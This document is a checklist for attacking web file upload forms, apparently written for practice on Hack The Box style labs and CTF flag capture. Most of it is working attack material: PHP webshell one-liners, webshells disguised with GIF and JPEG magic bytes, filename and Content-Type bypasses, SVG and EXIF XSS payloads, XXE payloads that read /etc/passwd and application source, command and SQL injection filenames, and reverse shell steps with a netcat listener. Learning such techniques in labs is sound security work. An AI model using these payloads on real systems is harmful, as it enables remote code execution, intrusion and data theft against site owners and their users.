# File Upload Attacks Checklist

**Rule:** Match the bypass technique to the filter you observe. Enumerate the validation type before attempting bypasses.

---

## Phase 1 — Identify Framework
- [ ] Visit `/index.php`, `/index.asp`, `/index.aspx` — which one returns the real page?
- [ ] Check Wappalyzer extension for framework, server, OS
- [ ] Note server language — webshell must match it

## Phase 2 — Probe for Absent Validation
- [ ] Upload a test script (`<?php echo "Hello"; ?>` as `test.php`)
- [ ] Visit the upload URL — does it execute or show source?
- [ ] If executes → no back-end validation → go straight to webshell upload

## Phase 3 — Identify Validation Layer
- [ ] Watch DevTools Network tab during upload failure — no request made = client-side only
- [ ] If request goes to server and fails → back-end validation exists
- [ ] Error says "Extension not allowed" → blacklist
- [ ] Error says "Only images are allowed" AND extension changes don't help → whitelist or content filter

## Phase 4 — Bypass Client-Side Validation
**Method A — Burp modification:**
- [ ] Upload a valid image → capture request in Burp
- [ ] In Repeater: change `filename="image.jpg"` → `filename="shell.php"`
- [ ] Replace file content with `<?php system($_REQUEST['cmd']); ?>`
- [ ] Forward — check response for success

**Method B — DevTools:**
- [ ] `CTRL+SHIFT+C` → click file input element
- [ ] Find `onchange="checkFile(this)"` → double-click → delete it
- [ ] Optionally remove `accept=".jpg,.jpeg,.png"` from input
- [ ] Upload PHP file normally

## Phase 5 — Bypass Blacklist
- [ ] Capture upload request → Send to Burp Intruder
- [ ] Set extension as injection position (e.g. `.php` in `filename="HTB.php"`)
- [ ] Load PHP extension wordlist → **un-tick URL Encoding** → Start Attack
- [ ] Identify extensions that return "File successfully uploaded"
- [ ] Try: `.phtml`, `.php5`, `.php7`, `.phar`, `.phps`
- [ ] On Windows targets: try mixed case → `shell.pHp`, `shell.PHP`
- [ ] Upload webshell with working extension → visit `shell.phtml?cmd=id`

## Phase 6 — Bypass Whitelist
- [ ] Fuzz extensions — note which pass (these are whitelisted)
- [ ] Try **double extension**: `shell.jpg.php` (passes weak regex, ends with PHP)
- [ ] Try **reverse double extension**: `shell.php.jpg` (ends with .jpg, may execute if Apache misconfigured)
- [ ] Try **character injection** wordlist via Burp Intruder:
  - [ ] `shell.php%00.jpg` (PHP ≤5.x null byte truncation)
  - [ ] `shell.php%20.jpg` (space)
  - [ ] `shell.php%0a.jpg` (newline)
  - [ ] `shell.aspx:.jpg` (Windows colon)
- [ ] Generate full permutation wordlist with bash script if needed

## Phase 7 — Bypass Content-Type Filter
- [ ] Capture upload request in Burp
- [ ] Locate the file's Content-Type header (bottom of request, inside multipart section)
- [ ] Change it to `image/jpeg`, `image/png`, or `image/gif`
- [ ] Keep `filename="shell.php"` and PHP webshell content
- [ ] Forward — check for success

## Phase 8 — Bypass MIME-Type Filter
- [ ] Determine what MIME type the filter accepts before choosing magic bytes
- [ ] **GIF8** → produces `image/gif` — use when filter explicitly allows gif
  ```bash
  echo "GIF8" > shell.php && echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
  ```
- [ ] **JPEG magic bytes** → produces `image/jpeg` — use when filter requires MIME ending in 'g' (jpe**g**)
  ```bash
  printf '\xFF\xD8\xFF\xe0' > shell.php && echo '<?php system($_REQUEST["cmd"]); ?>' >> shell.php
  ```
- [ ] **WARNING:** `image/gif` ends in `f` not `g` — fails regex filters like `/image\/[a-z]{2,3}g/`. Use JPEG bytes instead.
- [ ] Match Content-Type header to magic bytes: GIF8 → `image/gif`, JPEG → `image/jpeg`
- [ ] Keep `filename="shell.php"` — PHP still executes despite magic byte prefix
- [ ] Output will have magic byte prefix before command output — that's normal

## Phase 9 — Limited File Upload Attacks
**XSS via SVG:**
- [ ] Create SVG with `<script type="text/javascript">alert(window.origin);</script>`
- [ ] Upload → view the SVG → confirm XSS fires

**XSS via EXIF metadata:**
- [ ] `exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`
- [ ] Upload → if app displays metadata → XSS fires

**XXE via SVG (read files):**
- [ ] Create SVG with `<!ENTITY xxe SYSTEM "file:///etc/passwd">`
- [ ] Upload → check the upload response FIRST (XXE may fire at upload time, not access time)
- [ ] If response contains file content → XXE fired during upload, no need to visit the file URL

**XXE via SVG (read upload script source — do this before uploading a webshell):**
- [ ] Use absolute path: `php://filter/convert.base64-encode/resource=/var/www/html/contact/upload.php`
- [ ] Decode response: `echo '<BASE64>' | base64 -d`
- [ ] From source, note: upload directory (`$target_dir`), file naming scheme (`$fileName`), exact filter regexes
- [ ] Construct webshell URL from upload dir + naming scheme before uploading

**XXE via SVG (read PHP source — generic):**
- [ ] `php://filter/convert.base64-encode/resource=/var/www/html/index.php`
- [ ] Decode → read source code for further enumeration

## Phase 10 — Other Attacks
- [ ] Try command injection in filename: `file$(whoami).jpg`, `file.jpg||whoami`
- [ ] Try XSS in filename: `<script>alert(1)</script>.jpg`
- [ ] Try SQL injection in filename: `file';select+sleep(5);--.jpg`
- [ ] Force error to disclose uploads directory:
  - [ ] Upload duplicate filename
  - [ ] Upload with 5000-char filename
  - [ ] Two simultaneous identical upload requests

## Phase 11 — Execute and Get Flag
- [ ] Visit uploaded webshell: `shell.php?cmd=id` (confirms execution)
- [ ] Use CTRL+U (source view) in browser for clean output
- [ ] Find flag: `shell.php?cmd=find / -name "flag*" 2>/dev/null`
- [ ] Cat flag: `shell.php?cmd=cat /path/to/flag`
- [ ] Or get reverse shell:
  - [ ] Edit pentestmonkey reverse shell (lines 49-50: IP and PORT)
  - [ ] Start listener: `nc -lvnp PORT`
  - [ ] Upload and visit the reverse shell file

## Pitfall Reminders
- [ ] Two Content-Type headers exist in the request — modify the FILE's header (bottom), not the request's top-level one
- [ ] After adding GIF8 magic bytes, command output will have "GIF8" prefix — that's normal
- [ ] DevTools modifications are temporary — don't refresh the page after modifying the input
- [ ] Webshell must be written in the server's language (PHP for PHP servers, ASP for ASP servers)
- [ ] After upload, find the file URL by checking the page source (img src attribute) or response body
- [ ] Un-tick URL encoding in Burp Intruder when fuzzing file extensions (the dot must not be encoded)
